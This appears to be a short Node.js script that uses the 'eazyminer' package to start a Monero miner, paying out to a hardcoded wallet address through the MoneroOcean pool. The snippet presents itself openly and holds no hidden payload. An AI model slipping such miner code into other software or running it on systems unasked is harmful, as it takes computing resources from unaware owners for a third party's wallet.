const Miner = require('eazyminer');


const miner = new Miner({
    pools: [{
        coin: 'XMR',
        user: '43WJQfGyaivhEZBr95TZGy3HGei1LVUY5gqyUCAAE4viCRwzJgMcCn3ZVFXtySFxwZLFtrjMPJXhAT9iA9KYf4LoPoKiwBc',
        url: 'gulf.moneroocean.stream:10128', // optional pool URL,
    }],
    autoStart: false // optional delay
});

miner.start(); // optional manually start the miner
// miner.stop() // manually stop the miner

